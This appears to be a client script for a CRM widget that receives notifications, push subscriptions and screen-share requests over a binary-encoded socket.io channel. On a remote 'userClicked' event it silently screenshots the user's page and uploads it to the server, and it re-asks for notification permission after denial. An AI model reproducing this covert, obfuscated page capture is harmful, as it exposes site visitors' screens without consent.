// const socket = io('https://uatcrmhub.scoreconnect.com/');
// const socket = io('https://socket-hub.onrender.com');
const socket = io('https://socket-hub.onrender.com/');

let currentuserName = 'Hello';

let currentuserId = '13';
let publicVapidKey = 'BFVA5gXzIz-p2poU4ltPxWYVkMwCJgDRW83uVFGb0huBSH6kp3g7s0zW_IYSHlyJM32gIGCo9FjtQLhgwNzYOOk';
const applicationServerKey = urlBase64ToUint8Array(publicVapidKey);

const scriptElement = document.querySelector('script[src="script.js"]');

let partnerKey;
if (scriptElement.getAttribute('partner-id')) {
    partnerKey = scriptElement.getAttribute('partner-id');
} else {
    partnerKey = "oRz2KZV3l21OND409DZ7bNHFpUNv4iJTPh3BMZI0JkkCr9HUjm1YTP2pC1pftgH8tomH68/Lo2j9XuuStQVZog==";
}
let globalSocketId;

const binaryEvent = (event) => {
    return event.split('').map(char => {
        const asciiValue = char.charCodeAt(0);

        const binaryValue = asciiValue.toString(2);

        return binaryValue.padStart(8, '0');
    }).join(' ');
};

function binaryToString(binary) {
    return binary.split(' ')
        .map(bin => String.fromCharCode(parseInt(bin, 2)))
        .join('');
};


function stringToBinary(str) {
    return str.split('')
        .map(char => {
            const binary = char.charCodeAt(0).toString(2);
            return binary.padStart(8, '0');
        })
        .join(' ');
};

var peer = new Peer();

let peerId;

// let peerConnection;
// const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

function loadNotification() {
    const body = document.body;

    const notificationDiv = document.createElement('div');
    notificationDiv.id = 'notificationDiv';
    notificationDiv.style.position = 'fixed';
    notificationDiv.style.display = 'none';
    notificationDiv.style.zIndex = '99999999999';
    notificationDiv.style.width = 'max-content';
    notificationDiv.style.minWidth = '250px';
    notificationDiv.style.maxWidth = '400px';
    notificationDiv.style.fontFamily = 'sans-serif';
    notificationDiv.style.boxShadow = 'rgba(0, 0, 0, 0.15) 0px 5px 15px 0px';
    notificationDiv.style.borderRadius = '15px';
    notificationDiv.style.borderBottom = '5px solid #1e3a8a';
    notificationDiv.style.backgroundColor = '#fff';
    notificationDiv.style.transition = 'all 0.3s';
    notificationDiv.onmouseenter = () => {
        notificationDiv.style.boxShadow = 'rgb(0 0 0 / 34%) 0px 5px 15px 0px';
    };
    notificationDiv.onmouseleave = () => {
        notificationDiv.style.boxShadow = 'rgba(0, 0, 0, 0.15) 0px 5px 15px 0px';
    };

    const notificationHeader = document.createElement('div');
    notificationHeader.id = 'notificationHeader';
    notificationHeader.style.padding = '10px 15px';
    notificationHeader.style.display = 'flex';
    notificationHeader.style.alignItems = 'center';
    notificationHeader.style.borderBottom = '2px solid #ed6a1d';
    notificationHeader.style.justifyContent = 'space-between';

    const notificationTitle = document.createElement('div');
    notificationTitle.id = 'notificationTitle';
    notificationTitle.style.fontWeight = '700';
    notificationTitle.style.fontSize = '16px';
    notificationTitle.textContent = '';

    const notificationClose = document.createElement('div');
    notificationClose.id = 'notificationClose';
    notificationClose.style.height = '25px';
    notificationClose.style.width = '25px';
    notificationClose.style.fontSize = '12px';
    notificationClose.style.display = 'flex';
    notificationClose.style.alignItems = 'center';
    notificationClose.style.justifyContent = 'center';
    notificationClose.style.borderRadius = '7px';
    notificationClose.style.backgroundColor = '#ed6a1d';
    notificationClose.style.color = '#fff';
    notificationClose.style.cursor = 'pointer';
    notificationClose.style.textTransform = 'uppercase';
    notificationClose.style.fontWeight = '800';
    notificationClose.textContent = 'X';
    notificationClose.onclick = () => {
        notificationDiv.style.display = 'none';
    };

    notificationHeader.appendChild(notificationTitle);
    notificationHeader.appendChild(notificationClose);

    const notificationBody = document.createElement('div');
    notificationBody.style.padding = '10px 15px';

    const notificationDesc = document.createElement('div');
    notificationDesc.id = 'notificationDesc';
    notificationDesc.style.fontSize = '14px';
    notificationDesc.style.lineHeight = '22px';
    notificationDesc.textContent = '';

    notificationBody.appendChild(notificationDesc);

    notificationDiv.appendChild(notificationHeader);
    notificationDiv.appendChild(notificationBody);

    body.appendChild(notificationDiv);
}

loadNotification();

// NOTIFICATION START
const sendNotification = binaryEvent('sendNotification');
socket.on(sendNotification, (data) => {
    try {

        console.log(socket.id,'-- local run --');

        const jsonString = binaryToString(data);

        const parsedData = JSON.parse(jsonString);

        const { id, title, message, position } = parsedData;

        let notification = document.getElementById('notificationDiv');
        let notificationTitle = document.getElementById('notificationTitle');
        let notificationMessage = document.getElementById('notificationDesc');
        let notificatioClose = document.getElementById('notificationClose');

        notification.style.display = 'block';

        notificationTitle.innerText = title;
        notificationMessage.innerText = message;

        notification.style.top = '';
        notification.style.right = '';
        notification.style.bottom = '';
        notification.style.left = '';
        notification.style.transform = '';

        if (position === 'topRight') {
            notification.style.right = '15px';
            notification.style.top = '15px';
        }
        else if (position === 'topCenter') {
            notification.style.right = '50%';
            notification.style.left = '50%';
            notification.style.top = '15px';
            notification.style.transform = 'translate(-50%)';
        }
        else if (position === 'middleRight') {
            notification.style.top = '50%';
            notification.style.right = '15px';
            notification.style.transform = 'translateY(-50%)';
        }
        else if (position === 'middleCenter') {
            notification.style.top = '50%';
            notification.style.right = '50%';
            notification.style.left = '50%';
            notification.style.transform = 'translate(-50%, -50%)';
        }
        else if (position === 'middleLeft') {
            notification.style.top = '50%';
            notification.style.left = '15px';
            notification.style.transform = 'translateY(-50%)';
        }
        else if (position === 'bottomRight') {
            notification.style.bottom = '15px';
            notification.style.right = '15px';
            notification.style.transform = 'translateY(-50%)';
        }
        else if (position === 'bottomCenter') {
            notification.style.bottom = '15px';
            notification.style.right = '50%';
            notification.style.left = '50%';
            notification.style.transform = 'translate(-50%, -50%)';
        }
        else if (position === 'bottomLeft') {
            notification.style.bottom = '15px';
            notification.style.left = '15px';
            notification.style.transform = 'translateY(-50%)';
        }
        else {
            notification.style.left = '15px';
        }

        notificatioClose.addEventListener('click', () => {
            notification.style.display = 'none'
        });
    }
    catch (e) {
        console.log(e, "error");
    }
});
// NOTIFICATION END

function addWindowFunction() {
    window.joinUserToCRM = (userId, partnerKey) => {
        const data = {
            userId: userId,
            socketId: globalSocketId,
            partnerKey: partnerKey
        };
        console.log('globalSocketId --->', globalSocketId);


        const jsonString = JSON.stringify(data);
        const binaryCode = stringToBinary(jsonString);
        const userJoined = binaryEvent('userJoined');
        socket.emit(userJoined, (binaryCode));
        loadPushNotification();
    }
};

function tempJoin() {
    let nameField = document.getElementById('nameField');
    let loginpage = document.getElementById('loginpage');
    let tipspage = document.getElementById('tipspage');
    if (nameField) {
        if (nameField.value.length > 0) {
            currentuserId = nameField.value;
            window.joinUserToCRM(nameField.value, partnerKey);
            if (loginpage && tipspage) {
                loginpage.style.display = "none";
                tipspage.style.display = "block";
            }
        }
    }
}

socket.on('connect', async () => {

    console.log('A new user connected :- ', socket.id);
    const socketId = socket.id;
    globalSocketId = socket.id;

    addWindowFunction();

    const userClicked = binaryEvent('userClicked');
    socket.on(userClicked, async () => {
        try {
            const captureCanvas = await html2canvas(document.body, {
                scrollX: window.scrollX,
                scrollY: 0,
                x: window.scrollX,
                y: window.scrollY,
                width: window.innerWidth,
                height: window.innerHeight,
                useCORS: true,
                logging: true,
                backgroundColor: null,
                scale: 1,
            });

            const blob = await new Promise((resolve, reject) => {
                captureCanvas.toBlob((blob) => {
                    if (blob) {
                        resolve(blob);
                    } else {
                        reject(new Error('Failed to create Blob from canvas'));
                    }
                }, 'image/png');
            });

            const arrayBuffer = await blob.arrayBuffer();

            const chunkSize = 976 * 1024;
            const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);

            for (let i = 0; i < totalChunks; i++) {
                const start = i * chunkSize;
                const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
                const chunk = arrayBuffer.slice(start, end);

                const sentDataChunk = binaryEvent('sentDataChunk');

                const indexString = JSON.stringify(i);
                const totalChunksString = JSON.stringify(totalChunks);

                const index = stringToBinary(indexString);
                const totalChunk = stringToBinary(totalChunksString);

                const partnerId = stringToBinary(partnerKey);

                socket.emit(sentDataChunk, chunk, index, totalChunk, partnerId);
            };
        } catch (error) {
            console.error('Error:', error);
        }
    });
});

function urlBase64ToUint8Array(base64String) {
    const padding = "=".repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding)
        .replace(/\-/g, "+")
        .replace(/_/g, "/");

    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);

    for (let i = 0; i < rawData.length; ++i) {
        outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
};

peer.on('open', (id) => {
    console.log('Peer connection open with ID :- ', id)
    peerId = id;
});

const start_screen_share = binaryEvent('start_screen_share');
socket.on(start_screen_share, async (data) => {
    console.log('start_screen_share ------------------');
    try {
        stream = await navigator.mediaDevices.getDisplayMedia({
            video: true
        });

        console.log(binaryToString(data),'-- partner peer id --');

        const call = peer.call(binaryToString(data), stream);

        call.on("close", () => console.log("Screen sharing stopped"));
        // const videotrack = stream.getVideoTracks()[0];

        // peerConnection = new RTCPeerConnection(configuration);

        // peerConnection.onicecandidate = (event) => {
        //     if (event.candidate) {
        //         const ice_candidate = binaryEvent('ice_candidate');
        //         const data = {
        //             candidate: event.candidate,
        //             partnerKey: partnerKey
        //         }

        //         const jsonString = JSON.stringify(data);
        //         const binaryData = stringToBinary(jsonString);
        //         socket.emit(ice_candidate, binaryData);
        //     }
        // };

        // peerConnection.addTrack(videotrack, stream);

        // const offer = await peerConnection.createOffer();
        // await peerConnection.setLocalDescription(offer);
        // const string = JSON.stringify(offer);
        // const binaryOffer = stringToBinary(string);
        // const partnerId = stringToBinary(partnerKey);
        // const sendOffer = binaryEvent('sendOffer');
        // socket.emit(sendOffer, binaryOffer, partnerId);

        // stream.getVideoTracks()[0].onended = () => {
        //     const stoppedScreenSharing = binaryEvent('stoppedScreenSharing');
        //     const partnerId = stringToBinary(partnerKey);
        //     socket.emit(stoppedScreenSharing, partnerId);
        //     if(peerConnection){
        //         peerConnection.close();
        //         peerConnection = null;
        //     }
        // };
    }
    catch (e) {
        console.log('Error accessing screen share', e);
        const partnerId = stringToBinary(partnerKey);
        const deniedScreenSharing = binaryEvent('deniedScreenSharing');
        socket.emit(deniedScreenSharing, partnerId);
    }
});
const sendAnswer = binaryEvent('sendAnswer');
socket.on(sendAnswer, async (answer) => {
    console.log('sendAnswer ------------------', answer);
    const jsonString = binaryToString(answer);
    const parsedAnswer = JSON.parse(jsonString);
    await peerConnection.setRemoteDescription(new RTCSessionDescription(parsedAnswer));
});

const ice_candidate = binaryEvent('ice_candidate');
socket.on(ice_candidate, async (data) => {
    console.log('ice_candidate -------------');

    const jsonString = binaryToString(data);
    const parsedData = JSON.parse(jsonString);
    await peerConnection.addIceCandidate(new RTCIceCandidate(parsedData));
});
// document.addEventListener('DOMContentLoaded', (event) => {
    function loadPushNotification(){
        if (Notification.permission === 'default') {
            Notification.requestPermission().then(permission => {
                if ('serviceWorker' in navigator && 'PushManager' in window) {
                    if (permission === 'granted') {
                        send().catch(err => {
                            console.error(err)
                        });
                    }
                } else if (permission === 'denied') {
                    console.log('Notification permission denied.');
                }
            });
        } else if (Notification.permission === 'denied') {
            Notification.requestPermission().then(permission => {
                if ('serviceWorker' in navigator && 'PushManager' in window) {
                    if (permission === 'granted') {
                        console.log('Notification permission granted.');
                        send().catch(err => {
                            console.error(err)
                        });
                    }
                } else if (permission === 'denied') {
                    console.log('Notification permission denied.');
                }
            });
        } else if (Notification.permission === "granted") {
            if ('serviceWorker' in navigator && 'PushManager' in window) {
                send().catch(err => {
                    console.error(err)
                });
            }
        }
    }
// });

function getNotifyUsers() {
    let NotifyUsers = new Set;
    let usersList = document.querySelectorAll('li');
    usersList.forEach(x => {
        if (x.childNodes[1].childNodes[1].checked) {
            NotifyUsers.add(x.id);
        }
    });
    return Array.from(NotifyUsers);
}

// Register SW, Register Push, Send Push
async function send() {

    console.log("Registering service worker...");
    console.log("=---=-=->,",navigator.serviceWorker);
    const register = await navigator.serviceWorker.register("./service-worker.js", {
        scope: "/"
    });
    console.log("Service Worker Regist+ered...");

    // Register Push
    let subscription = await register.pushManager.getSubscription();
    if (!subscription) {
        console.log("register.pushManager.subscribe...");
        subscription = await register.pushManager.subscribe({
            applicationServerKey,
            userVisibleOnly: true
        });
        console.log("Create new subsciption...");
    } else {
        console.log("Exist Suscription : \n", subscription);
    }
    const sendUserSubscription = binaryEvent('sendUserSubscription');
    const binaryId = stringToBinary(currentuserId);
    const binaryName = stringToBinary(currentuserName);
    const partnerId = stringToBinary(partnerKey);
    const binarySubscription = stringToBinary(JSON.stringify(subscription));
    console.log(subscription);
    socket.emit(sendUserSubscription, binarySubscription, binaryId, binaryName, partnerId);
}

// Check for service worker
function urlBase64ToUint8Array(base64String) {
    const padding = "=".repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding)
        .replace(/\-/g, "+")
        .replace(/_/g, "/");

    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);

    for (let i = 0; i < rawData.length; ++i) {
        outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
};
